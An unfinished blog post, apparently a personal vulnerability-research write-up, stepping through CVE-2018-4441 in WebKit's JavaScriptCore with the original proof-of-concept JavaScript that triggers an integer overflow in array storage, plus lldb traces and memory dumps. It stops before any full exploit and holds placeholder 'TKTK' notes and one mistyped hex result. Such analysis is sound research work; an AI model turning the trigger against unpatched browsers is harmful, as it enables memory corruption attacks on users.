<!DOCTYPE HTML>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Exploiting CVE-2018-4441</title>

    <meta name="robots" content="noodp"/>
    
    
      <meta name="description" content="">
    

    <link rel="canonical" href="http://example.org/posts/exploiting-cve-2018-4441/"/>
  
    <meta property="og:title" content="Exploiting CVE-2018-4441" />
<meta property="og:description" content="Initial setup and gotchas Did this on MacOS 10.15.2, with some patches to get JSC building. They&rsquo;re attached TKTK
Revision 222368
Also, I needed to change the framework reference in the build jsc to use one local to the project rather than the system JavaScriptCore.framework:
install_name_tool -change /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore /Users/jeff/Code/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore jsc How it works CVE-2018-4441 exploits an integer overflow bug in JSArray::shiftCountWithArrayStorage. Here is the PoC provided in the original write-up by lokihardt:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.org/posts/exploiting-cve-2018-4441/" />


    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Exploiting CVE-2018-4441"/>
<meta name="twitter:description" content="Initial setup and gotchas Did this on MacOS 10.15.2, with some patches to get JSC building. They&rsquo;re attached TKTK
Revision 222368
Also, I needed to change the framework reference in the build jsc to use one local to the project rather than the system JavaScriptCore.framework:
install_name_tool -change /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore /Users/jeff/Code/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore jsc How it works CVE-2018-4441 exploits an integer overflow bug in JSArray::shiftCountWithArrayStorage. Here is the PoC provided in the original write-up by lokihardt:"/>

    <meta itemprop="name" content="Exploiting CVE-2018-4441">
<meta itemprop="description" content="Initial setup and gotchas Did this on MacOS 10.15.2, with some patches to get JSC building. They&rsquo;re attached TKTK
Revision 222368
Also, I needed to change the framework reference in the build jsc to use one local to the project rather than the system JavaScriptCore.framework:
install_name_tool -change /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore /Users/jeff/Code/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore jsc How it works CVE-2018-4441 exploits an integer overflow bug in JSArray::shiftCountWithArrayStorage. Here is the PoC provided in the original write-up by lokihardt:">

<meta itemprop="wordCount" content="844">



<meta itemprop="keywords" content="" />

    
    <link rel="stylesheet" href="http://example.org/css/bundle.min.css">
</head>
<body>
	<header>
<nav>
   <h1><a href="http://example.org/">My New Hugo Site</a></h1>
   <ul>
    
   </ul>
</nav>
</header>	
	
    <h1>Exploiting CVE-2018-4441</h1>
	<time datetime="0001-01-01 00:00:00 &#43;0000 UTC" itemprop="datePublished">January 1, 0001</time>
	<h1 id="initial-setup-and-gotchas">Initial setup and gotchas</h1>
<p>Did this on MacOS 10.15.2, with some patches to get JSC building.  They&rsquo;re attached TKTK</p>
<p>Revision 222368</p>
<p>Also, I needed to change the framework reference in the build <code>jsc</code> to use one local to the project rather than the system JavaScriptCore.framework:</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">install_name_tool -change /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore /Users/jeff/Code/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore jsc</code></pre></div>
<h1 id="how-it-works">How it works</h1>
<p>CVE-2018-4441 exploits an integer overflow bug in <code>JSArray::shiftCountWithArrayStorage</code>.  Here is the PoC provided in the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1685">original write-up by lokihardt</a>:</p>
<p><div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#007020;font-weight:bold">function</span> main() {
    <span style="color:#007020;font-weight:bold">let</span> arr <span style="color:#666">=</span> [<span style="color:#40a070">1</span>];

    arr.length <span style="color:#666">=</span> <span style="color:#40a070">0x100000</span>;
    arr.splice(<span style="color:#40a070">0</span>, <span style="color:#40a070">0x11</span>);

    arr.length <span style="color:#666">=</span> <span style="color:#40a070">0xfffffff0</span>;
    arr.splice(<span style="color:#40a070">0xfffffff0</span>, <span style="color:#40a070">0</span>, <span style="color:#40a070">1</span>);
}

main();
</code></pre></div>
Let&rsquo;s start by setting a breakpoint at <code>ArrayPrototype.cpp:1054</code>.  Then we will step through the PoC script and examine the internal state of <code>arr</code>.</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#007020;font-weight:bold">let</span> arr <span style="color:#666">=</span> [<span style="color:#40a070">1</span>];

arr.length <span style="color:#666">=</span> <span style="color:#40a070">0x100000</span>;
</code></pre></div>
<p>Changing the length to 0x100000 will change the array&rsquo;s indexing method from <code>Int32Shape</code> to <code>ArrayStorageShape</code>.  The minimum length of an array to make this switch is 100000 (not 0x10000), defined by <code>MIN_SPARSE_ARRAY_LENGTH</code> in <code>ArrayConventions.h</code>.  This bug will only be triggered on arrays backed by <code>ArrayStorage</code>.</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">arr.splice(<span style="color:#40a070">0</span>, <span style="color:#40a070">0x11</span>);
</code></pre></div>
<p>We should hit our breakpoint when this line executes but before anything really happens with it.</p>
<pre><code>   frame #0: 0x0000000100c777e5 JavaScriptCore`JSC::arrayProtoFuncSplice(exec=&amp;lt;unavailable&gt;) at ArrayPrototype.cpp:1054:19 [opt]
   1051     }
   1052 
   1053     unsigned itemCount = std::max&amp;lt;int&gt;(exec-&gt;argumentCount() - 2, 0);
-&gt; 1054     if (itemCount &amp;lt; actualDeleteCount) {
   1055         shift&amp;lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
   1056         RETURN_IF_EXCEPTION(scope, encodedJSValue());
   1057     } else if (itemCount &gt; actualDeleteCount) {
</code></pre><!-- 
{{&lt; highlight cpp "linenos=table,linenostart=1053,hl_lines=2" >}}
unsigned itemCount = std::max&lt;int>(exec->argumentCount() - 2, 0);
if (itemCount &lt; actualDeleteCount) {
    shift&lt;JSArray::ShiftCountForSplice>(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
    RETURN_IF_EXCEPTION(scope, encodedJSValue());
} else if (itemCount > actualDeleteCount) {
    unshift&lt;JSArray::ShiftCountForSplice>(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);
    RETURN_IF_EXCEPTION(scope, encodedJSValue());
}
{{&lt;/ highlight >}}
-->
<p>Recall the method signature for Array.prototype.splice():</p>
<pre><code>array.splice(start[, deleteCount[, item1[, item2[, â€¦]]]])
</code></pre><p>Here is what each (C++) variable means:</p>
<ul>
<li><code>itemCount</code>: The number of items to be inserted in the deleted space.  We are just deleting things, so this is 0.</li>
<li><code>actualDeleteCount</code>: The number of items we are deleting.  <code>deleteCount</code> can exceed the length of the array, it will just be clamped.  17 in this case.</li>
</ul>
<p>We eventually end up in <code>JSArray::shiftCountWithArrayStorage</code> where the bug exists:</p>
<pre><code>   frame #0: 0x000000010023ff2c JavaScriptCore`JSC::JSArray::shiftCountWithArrayStorage(this=0x00000001055c4320, vm=0x0000000105100000, startIndex=0, count=17, storage=0x00000014000e40a8) at JSArray.cpp:920:30 [opt]
   917      
   918      // If the array contains holes or is otherwise in an abnormal state,
   919      // use the generic algorithm in ArrayPrototype.
-&gt; 920      if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm)) 
   921          || hasSparseMap() 
   922          || shouldUseSlowPut(indexingType())) {
   923          return false;
</code></pre><p>It is worth viewing the state of <code>arr</code> in memory at this time.  <code>this</code> refers to the JSArray object, and <code>storage</code> point to the ArrayStorage object.</p>
<p>Here is a color-coded view of <code>this</code>, with the output of its class layout below it:</p>
<pre><code>(lldb) x/2g this
0x1055c4320: 0x<span style="color:#bf00bf">01</span><span style="color:#04b3a4">08</span><span style="color:#ca9600">22</span><span style="color:blue">0b</span><span style="color:green">00000058</span> <span style="color:red">0x00000014000e40a8</span></code></pre>
<pre>
<code>  +0 { 16} JSC::JSArray
  +0 { 16}     JSC::JSNonFinalObject
  +0 { 16}         JSC::JSObject
  +0 {  8}             JSC::JSCell
  +0 {  1}                 JSC::HeapCell
  +0 &lt;  4&gt;                 <span style="color:green">JSC::StructureID m_structureID;</span>
  +4 &lt;  1&gt;                 <span style="color:blue">JSC::IndexingType m_indexingTypeAndMisc;</span>
  +5 &lt;  1&gt;                 <span style="color:#ca9600">JSC::JSType m_type;</span>
  +6 &lt;  1&gt;                 <span style="color:#04b3a4">JSC::TypeInfo::InlineTypeFlags m_flags;</span>
  +7 &lt;  1&gt;                 <span style="color:#bf00bf">JSC::CellState m_cellState;</span>
  +8 &lt;  8&gt;             JSC::CagedBarrierPtr&lt;Gigacage::JSValue, JSC::Butterfly&gt; m_butterfly;
  +8 &lt;  8&gt;                 JSC::AuxiliaryBarrier&lt;WTF::CagedPtr&lt;Gigacage::JSValue, JSC::Butterfly&gt; &gt; m_barrier;
  +8 &lt;  8&gt;                     WTF::CagedPtr&lt;Gigacage::JSValue, JSC::Butterfly&gt; m_value;
  +8 &lt;  8&gt;                         <span style="color:red">JSC::Butterfly * m_ptr;</span>
Total byte size: 16
Total pad bytes: 0</code>
</pre>
<p>And here is the butterfly/ArrayStorage object:</p>
<pre>
<code>(lldb) x/16w 0x00000014000e40a8-0x10
0x14000e4098: 0x05100000 0x00000001 <span style="color:#3211ff">0x00100000</span> <span style="color:#67d000">0x00000003</span>
<span style="color:red">0x14000e40a8:</span> <span style="color:red">0x00000000</span> 0x00000000 0x00000000 <span style="color:#af9a00">0x00000001</span>
0x14000e40b8: 0x00000001 0xffff0000 0x00000000 0x00000000
0x14000e40c8: 0x00000000 0x00000000 0x00000000 0x00000000 </code>
</pre>
<p>Breakdown of these values:</p>
<ul>
<li><span style="color:red"><code>0x14000e40a8</code></span>: Address pointed to in the JSArray object.</li>
<li><span style="color:#67d000">vectorLength</span>: The amount of allocated space for the vector.</li>
<li><span style="color:#3211ff">publicLength</span>: The assignable length property on the JavaScript object.</li>
<li><span style="color:#af9a00">m_numValues</span>: The actual amount of members currently in the vector.  This is the value that will overflow.</li>
</ul>
<p>TKTK Explanation of why holesMustForwardToPrototype is false</p>
<p>Continuing to step through the debugger, we eventually end up here:</p>
<pre><code>   frame #0: 0x000000010023ffb6 JavaScriptCore`JSC::JSArray::shiftCountWithArrayStorage(this=0x00000001055c4320, vm=&lt;unavailable&gt;, startIndex=&lt;unavailable&gt;, count=&lt;unavailable&gt;, storage=&lt;unavailable&gt;) at JSArray.cpp:931:34 [opt]
   928      
   929      unsigned length = oldLength - count;
   930      
-&gt; 931      storage-&gt;m_numValuesInVector -= count;
   932      storage-&gt;setLength(length);
   933      
   934      unsigned vectorLength = storage-&gt;vectorLength();
</code></pre><p>And this is where we hit the overflow bug.  Recall that <code>count</code> is 17, <code>m_numValuesInVector</code> is currently 1.  After we step to the next line&hellip;</p>
<pre>
<code>(lldb) x/16w 0x00000014000e40a8-0x10
0x14000e4098: 0x05100000 0x00000001 <span style="color:#3211ff">0x00100000</span> <span style="color:#67d000">0x00000003</span>
<span style="color:red">0x14000e40a8:</span> <span style="color:red">0x00000000</span> 0x00000000 0x00000000 <span style="color:#af9a00;font-weight:bold">0xfffffff0</span>
0x14000e40b8: 0x00000001 0xffff0000 0x00000000 0x00000000
0x14000e40c8: 0x00000000 0x00000000 0x00000000 0x00000000 </code>
</pre>
<p>0x1 - 0x11 = 0xFFFFFF00.</p>
<h3 id="what-can-we-do-with-this-discrepancy">What can we do with this discrepancy?</h3>
<p>Unfortunately <code>m_numValuesInVector</code> is only used in a few places.  Doing an <code>unshift</code> operation is one of them, as we see further into the PoC.</p>
<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#007020;font-weight:bold">function</span> main() {
    <span style="color:#007020;font-weight:bold">let</span> arr <span style="color:#666">=</span> [<span style="color:#40a070">1</span>];

    arr.length <span style="color:#666">=</span> <span style="color:#40a070">0x100000</span>;
    arr.splice(<span style="color:#40a070">0</span>, <span style="color:#40a070">0x11</span>);

<span style="display:block;width:100%;background-color:#d8d8d8">    arr.length <span style="color:#666">=</span> <span style="color:#40a070">0xfffffff0</span>;
</span><span style="display:block;width:100%;background-color:#d8d8d8">    arr.splice(<span style="color:#40a070">0xfffffff0</span>, <span style="color:#40a070">0</span>, <span style="color:#40a070">1</span>);
</span>}

main();
</code></pre></div>
<p>Let&rsquo;s break at JSArray.cpp:1135.</p>
<pre><code> frame #0: 0x00000001002407cb JavaScriptCore`JSC::JSArray::unshiftCountWithArrayStorage(this=0x00000001055c4320, exec=0x00007ffeefbfe9f0, startIndex=4294867297, count=1, storage=0x00000014000e40a8) at JSArray.cpp:1135:29 [opt]
   1132 
   1133     // If the array contains holes or is otherwise in an abnormal state,
   1134     // use the generic algorithm in ArrayPrototype.
-&gt; 1135     if (storage-&gt;hasHoles() || storage-&gt;inSparseMode() || shouldUseSlowPut(indexingType()))
   1136         return false;
   1137 
   1138     bool moveFront = !startIndex || startIndex &lt; length / 2;
</code></pre><p><code>storage-&gt;hasHoles()</code> returns true if <code>m_numValuesInVector</code> does not equal <code>publicLength</code>, which is why we must set <code>arr.length</code> to our overflowed, erroneous value.</p>
<p>moveFront is interesting.</p>
<h1 id="thanks-and-tools-used">Thanks and tools used</h1>
<p>The <a href="https://doar-e.github.io/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/#target-modifications">dbg function</a> invented by yrp</p>
 	               			  

	<footer>
 <a href="#">&uarr;Back to top</a> || <a href="http://example.org/index.xml">RSS</a> || <a href="">Twitter</a> || <a href="">LinkedIn</a><br>
 
</footer>


    




</body>
</html>	